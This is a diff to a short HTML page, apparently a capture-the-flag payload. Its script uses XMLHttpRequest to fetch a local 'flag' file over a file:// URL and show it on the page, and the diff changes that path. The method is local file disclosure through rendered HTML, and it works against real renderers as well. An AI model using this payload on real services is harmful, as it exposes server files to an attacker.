@@ -1,7 +1,7 @@
 <html>
     <body>
 
-        ver 4
+        ver 5
 
  <div id="file" style="color: white"></div>
     <script>
@@ -12,7 +12,7 @@
 
         var oReq = new XMLHttpRequest();
         oReq.addEventListener("load", reqListener);
-        oReq.open("GET", "file:///app/flag");
+        oReq.open("GET", "file://./flag");
         oReq.send();
     </script>        
     </body>
